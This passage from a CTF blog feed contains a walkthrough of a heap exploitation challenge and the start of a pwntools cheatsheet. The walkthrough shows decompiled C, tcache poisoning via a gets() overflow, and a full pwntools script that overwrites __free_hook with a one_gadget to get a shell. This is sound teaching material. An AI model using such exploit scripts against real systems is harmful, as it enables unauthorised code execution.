</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;ERROR: Waitlist is maxed out.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The binary will allocate a fixed size chunk (using <code>malloc(0x18)</code>) to indicate a queue number in the waitlist. The chunk will take on the value of <code>name</code>, which we can control based on our input.</p>
<figure>
<img src="assets/waitlist.png">
<figcaption>In this case, our chunk is allocated to the address `0x555555604260`. Our chunk holds the value `HELLOTHERE`, which is the name that I had input.</figcaption>
</figure>
<p>Also to take note, while inputting <code>name</code>, the <code>gets()</code> function is used, which is vulnerable to buffer overflow (sus).</p>
<p>Afterwards, the pointer to the chunk is added to the waitlist, which is an array of max size 10.</p>
<figure>
<img src="assets/waitlist (2).png" width=75%>
<figcaption>The first element of waitlist holds the value of 0x555555604260, which is the address of the chunk at queue number 0.</figcaption>
</figure>
<br>
<p>Moving on to <code>delete()</code>, which is option 3 (leaving the waitlist):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">delete</span><span class="p">(</span><span class="n">uint</span> <span class="n">param_1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(((</span><span class="kt">int</span><span class="p">)</span><span class="n">param_1</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">listSize</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">param_1</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Invalid index!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">waitlist</span><span class="p">)[(</span><span class="kt">int</span><span class="p">)</span><span class="n">param_1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;You have forfeited your queue #%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">param_1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The function lets us free a chunk, based on the index on the waitlist. However, after freeing, the chunk isn&rsquo;t cleared (the pointer isn&rsquo;t set to NULL).</p>
<br>
<p>Finally, let&rsquo;s check out <code>view()</code>, which is option 4 (viewing the waitlist):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">view</span><span class="p">(</span><span class="kt">int</span> <span class="n">param_1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((</span><span class="n">param_1</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">listSize</span> <span class="o">&lt;</span> <span class="n">param_1</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Invalid index!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Name: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,(</span><span class="o">&amp;</span><span class="n">waitlist</span><span class="p">)[</span><span class="n">param_1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Not much to say, we are able to view the value of a chunk based on the index.</p>
<h2 id="obtaining-libc-leak">Obtaining libc leak</h2>
<p>As mentioned above, the binary directly gives us the address of <code>exit()</code>.</p>
<p>Additionally, libc 2.27 was provided as part of the challenge. Using this, we can calculate the libc base address.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;change your mind: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">exit</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;exit:&#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">exit</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">exit</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">exit</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;libc_base:&#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
</span></span></code></pre></div><p>Now&hellip; moving on to the heap stuff :)</p>
<h2 id="a-short-introduction-to-heap--stuff">A Short Introduction to Heap &amp; Stuff</h2>
<p>When we use <code>malloc(size)</code> to allocate a chunk, a chunk of size rounded to the next 0x10 will be allocated in the heap.</p>
<br>
<p>The chunk consists of 2 parts - the metadata, and the user data:</p>
<ul>
<li>The first 0x8 bytes is the <code>mchunk_prev_size</code>
<ul>
<li>This only applies if an adjacent chunk is free</li>
<li>Otherwise, this 0x8 bytes will be used as part of the previous chunk&rsquo;s user data</li>
</ul>
</li>
<li>The next 0x8 bytes represents the size of the chunk <code>mchunk_size</code>
<ul>
<li>The last 3 bits are used as &ldquo;flags&rdquo;, which is left as an exercise to the reader to find out</li>
</ul>
</li>
<li>Finally, the rest is user data of the minimum <code>size</code> requested</li>
</ul>
<figure class="full">
  <img src="assets/waitlist (4).png" width=60%>
  <figcaption class="center">Credits to pwn.college</figcaption>
</figure>
<p>Let&rsquo;s demonstrate it for this binary. I have allocated a chunk with the <code>name</code> value: <code>BBBBB</code>.</p>
<ul>
<li>Using <code>heap chunks</code> in gdb, we can see that the chunk is at the address 0x555555604260
<ul>
<li>Note: this address is where our user data starts (<code>mem_addr</code> in the image above). <code>chunk_addr</code> is 0x555555604260-0x10=0x555555604250.</li>
</ul>
</li>
<li>The green box represents the <code>mchunk_prev_size</code> (not relevant in this case)</li>
<li>The orange box represents <code>mchunk_size</code>, which is 0x20
<ul>
<li>It writes 0x21 due to the abovementioned flags</li>
</ul>
</li>
<li>The red box represents the user data (<code>0x4242424242</code> = <code>BBBBB</code>)</li>
</ul>
<figure class="full">
<img src="assets/waitlist (3).png">
<figcaption></figcaption>
</figure>
<p>What happens when we free the chunk? In this case, the chunk will enter tcache.</p>
<p>The tcache is a singly linked list. Each tcache entry will point to the next entry in the list (eg in the diagram below, A points to B). When we use <code>malloc</code> to allocate a new chunk, the latest entry that entered tcache will be used (so it is a last-in-first-out LIFO system).</p>
<figure class="full">
<img src="assets/waitlist (6).png" width=60%>
<figcaption>Credits to pwn.college</figcaption>
</figure>
<p>Structure of a tcache entry:</p>
<ul>
<li>the first 0x8 bytes <code>next</code> is the address of the next entry (or NULL if no next entry)</li>
<li>the next 0x8 bytes is the <code>key</code> (unimportant here, left as an exercise to the reader)</li>
</ul>
<figure class="full">
<img src="assets/waitlist (5).png" width=60%>
<figcaption>Credits to pwn.college</figcaption>
</figure>
<p>Let&rsquo;s go back to our example using the binary. We free the chunk by choosing option 3 and deleting the queue number 0.</p>
<p>Going back to the same address, we see that our user data is now gone. Instead, we have:</p>
<ul>
<li>The address of the next entry (red box), which is null because there is no next entry.</li>
<li>The key (green box)</li>
</ul>
<figure class="full">
<img src="assets/waitlist (7).png">
<figcaption></figcaption>
</figure>
<p>Let&rsquo;s try another situation. Restart the binary and join the waitlist twice (queue #0 and queue #1). Then, leave the waitlist for both of them.</p>
<p>In this case, we allocated 2 chunks and then freed both of them.</p>
<figure class="full">
<img src="assets/waitlist (8).png">
<figcaption>(Prior to leaving the waitlist): Two chunks have been allocated. The first one has value AAAAA and the second one has value BBBBB.</figcaption>
</figure>
<p>After leaving the waitlist (ie freeing the chunks), here&rsquo;s the new heap layout:</p>
<ul>
<li>The red boxes indicate the next entry, and green boxes indicate the key for each entry</li>
<li>We can see that for the first entry, the next entry value is null</li>
<li>However for the second entry, the next entry value is the address of the first entry</li>
</ul>
<figure class="full">
<img src="assets/waitlist (9).png">
<figcaption></figcaption>
</figure>
<p>With this knowledge, how can we exploit this?</p>
<h2 id="heap-overflow">Heap overflow</h2>
<p>As mentioned earlier, there is a buffer overflow vulnerability in <code>add()</code> due to <code>gets()</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">add</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">__s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">listSize</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">__s</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Name: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">gets</span><span class="p">(</span><span class="n">__s</span><span class="p">);</span> <span class="c1">// Vulnerable to buffer overflow
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">listSize</span> <span class="o">=</span> <span class="n">listSize</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="o">&amp;</span><span class="n">waitlist</span><span class="p">)[(</span><span class="kt">int</span><span class="p">)</span><span class="n">listSize</span><span class="p">]</span> <span class="o">=</span> <span class="n">__s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;You are now in queue #%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">listSize</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;ERROR: Waitlist is maxed out.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Let&rsquo;s spam a bunch of characters in the name field and see what happens.</p>
<pre tabindex="0"><code>Scenario: 
1. Join the waitlist (queue #0) with name A*0x8
2. Join the waitlist (queue #1) with name B*0x8
3. Join the waitlist (queue #2) with name C*0x8
4. Leave the waitlist (queue #1)
5. Join the waitlist (queue #3, which is at the location of queue #1
        due to tcache LIFO system) with name D*0x30
6. View queue #2
</code></pre><p>After step 4:</p>
<figure class="full">
<img src="assets/waitlist (10).png" width=90%>
<figcaption></figcaption>
</figure>
<p>After step 5:</p>
<figure class="full">
<img src="assets/waitlist (11).png">
<figcaption>We have overflowed queue #3, and have edited the chunk at queue #2</figcaption>
</figure>
<p>After step 6: we obtained a SIGSEGV. This means that from overflowing queue #3 into queue #2, we were able to successfully edit the chunk at queue #2 (hence crashing the binary).</p>
<p>Thus, this acts as a proof of concept of heap overflow in the binary, in which we can overflow values to and hence control the next chunk.</p>
<p>So how can we take advantage of this to get a shell?</p>
<h2 id="obtaining-shell">Obtaining Shell</h2>
<p>Through googling, I learnt that if I could allocate a chunk at <code>__free_hook</code>, I would be able to obtain a shell.</p>
<p>How can I control the location of a chunk though?</p>
<pre tabindex="0"><code>Scenario:
1. Join the waitlist 3 times (queue #0, #1, #2)
2. Leave the waitlist 3 times in the order of queue #0, #2, #1
</code></pre><p>After step 2:</p>
<figure class="full">
<img src="assets/waitlist (14).png">
<figcaption></figcaption>
</figure>
<p>When we next join the waitlist, queue #3 will take the position of queue #1 due to tcache&rsquo;s LIFO system.  In this case, can&rsquo;t we overflow into queue #2, editing the next tcache entry of queue #2 (red box) and changing it to <code>__free_hook</code> instead?</p>
<br>
<pre tabindex="0"><code>Scenario (cont):
3. Join the waitlist (queue #3) and edit the &#34;next tcache entry&#34; of queue #2
</code></pre><p>We need to fill in the metadata of queue #2&rsquo;s chunk correctly to prevent the binary from crashing.</p>
<ul>
<li>Use <code>b'A'*0x18</code> to fill the user input buffer of queue #3 (since our input starts at the blue box)</li>
<li><code>b'\x21' + b'\x00'*7</code> ensures that <code>mchunk_size</code> of queue #2 maintains as 0x21</li>
<li><code>p64(libc.symbols['__free_hook'])</code> overwrites next tcache entry to <code>__free_hook</code> (ensure that libc base is accounted for in this address)</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x21</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">])</span>
</span></span></code></pre></div><p>As such, we have successfully overwrote the tcache next entry value of queue #2. That means the next chunk allocated after allocating the chunk at queue #2 will take the location of <code>__free_hook</code>!</p>
<pre tabindex="0"><code>Scenario (cont):
4. Join the waitlist (queue #4, in position queue #2) and fill the name as anything
5. Join the waitlist (queue #5, at the location of __free_hook) and fill the name using one_gadget
6. Leave the waitlist (queue #5)
7. Profit :)
</code></pre><p>To explain why <code>__free_hook</code> works to get a shell:</p>
<ul>
<li><code>__free_hook</code> is called whenever <code>free()</code> is used.</li>
<li><a href="https://github.com/david942j/one_gadget">one_gadget</a> is a nifty programme to get RCE from one gadget.</li>
<li>By replacing <code>__free_hook</code> with one_gadget, our RCE gadget will instead be called whenever <code>free()</code> is used</li>
<li>Thus, by deleting a chunk (using option 4), the one_gadget will proc, leading to shell :D</li>
</ul>
<h2 id="full-exploit">Full exploit</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">local</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./waitlist_patched&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="n">local</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;ctf2.whitehats.site&#39;</span><span class="p">,</span> <span class="mi">2005</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="n">stdin</span><span class="o">=</span><span class="n">PTY</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;libc.so.6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">join</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">index</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">leave</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">index</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">get libc leak
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;change your mind: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">exit</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;exit:&#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">exit</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">exit</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">exit</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;libc_base:&#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">heap overflow due to gets()
</span></span></span><span class="line"><span class="cl"><span class="s1">control the location of the next chunk to be at __free_hook to pop a shell
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">join</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;AAAAA&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">join</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;BBBBB&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">join</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;CCCCC&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">leave</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">leave</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">leave</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x21</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">join</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">join</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;random&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">one_gadget</span> <span class="o">=</span> <span class="mh">0x4f302</span> <span class="o">+</span> <span class="n">libc_base</span>
</span></span><span class="line"><span class="cl"><span class="n">join</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">leave</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;5&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># WH2024{w4ItIng_In_L1n3_f0r_c@t3g0ry_10K}</span>
</span></span></code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Pwntools Cheatsheet</title>
            <link>https://enxgmatic.github.io/blog/pwntools-cheatsheet/</link>
            <pubDate>Sun, 03 Mar 2024 17:37:08 +0800</pubDate>
            
            <guid>https://enxgmatic.github.io/blog/pwntools-cheatsheet/</guid>
            <description>&lt;p&gt;This is a very brief cheatsheet and introduction to &lt;code&gt;pwntools&lt;/code&gt; for CTFs. I am writing this specifically for Sieberrsec CTF 5.0, but it can be applied for all CTFs.&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;install-and-import&#34;&gt;Install and Import&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;pip install pwntools&lt;/code&gt;: to install pwntools, use this command in the terminal&lt;/p&gt;
&lt;p&gt;&lt;code&gt;from pwn import *&lt;/code&gt;: put this at the top of your python file to import pwntools.&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;making-connections&#34;&gt;Making connections&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;r = remote(HOST, PORT)&lt;/code&gt;: connects to a remote connection, with the relevant host and port&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>This is a very brief cheatsheet and introduction to <code>pwntools</code> for CTFs. I am writing this specifically for Sieberrsec CTF 5.0, but it can be applied for all CTFs.</p>
<br>
<h3 id="install-and-import">Install and Import</h3>
<p><code>pip install pwntools</code>: to install pwntools, use this command in the terminal</p>
<p><code>from pwn import *</code>: put this at the top of your python file to import pwntools.</p>
<br>
<h3 id="making-connections">Making connections</h3>
<p><code>r = remote(HOST, PORT)</code>: connects to a remote connection, with the relevant host and port</p>
<ul>
<li>Eg if the CTF tells you to connect to the instance via <code>nc 1.1.1.1 2000</code>, <code>1.1.1.1</code> is the host, and <code>2000</code> is the port</li>
<li>This command is in effect the same as <code>nc</code></li>
</ul>
<p><code>r.interactive()</code>: allows you to interact with the process yourself</p>
<ul>
<li>We usually use this at the very end after we have obtained the shell or when the flag is printed out</li>
</ul>
<br>
<h3 id="elf-manipulation">ELF manipulation</h3>
<p>CTF challenges usually provide an ELF file for you to run. An ELF file is essentially the linux version of an <code>.exe</code> file.</p>
<br>
<p><code>elf = ELF('./NAME')</code>: this allows you to get information about an ELF file of the specified name</p>
<p><code>r = elf.process(stdin=PTY)</code>: this executes the ELF file</p>
<ul>
<li>Usually we use this to test the challenge locally</li>
<li>Then switch to <code>remote(HOST,PORT)</code> to connect to the remote instance</li>
</ul>
<p><code>elf.symbols['FUNCTION']</code>: gets the address of the specified function</p>
<ul>
<li>Eg <code>elf.symbols['main']</code> gives the address of main()</li>
</ul>
<br>
<h3 id="reading-data-and-providing-input">Reading data and providing input</h3>
<p><code>conn.recvline()</code>: reads one line of data</p>
<p><code>conn.recvlines(N)</code>: reads N lines of data</p>
<p><code>conn.recvuntil(VALUE)</code>: reads data until VALUE</p>
<p><code>conn.sendline(VALUE)</code>: sends an input of VALUE</p>
<br>
<h3 id="further-readings">Further readings</h3>
<p>These commands are left as an exercise to the reader to learn more about. For more commands, refer to their <a href="https://docs.pwntools.com/en/stable/">documentation</a>.</p>
<p><code>p64(NUMBER)</code> and <code>p32(NUMBER)</code>: struct unpacking</p>
<p><code>elf.got['write']</code>,<code>elf.plt['write']</code>: get the GOT and PLT addresses</p>
<br>
<h3 id="sample">Sample</h3>
<p>Imagine that you are provided with a file which does this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">n1</span> <span class="o">=</span> <span class="nf">rand</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">input</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// prints &#34;n1: xx&#34; where xx is the number randomly generated
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;n1: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">n1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;What is the value of n1?&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// gets an integer input
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;d&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">input</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// get the flag if input is equal to n1
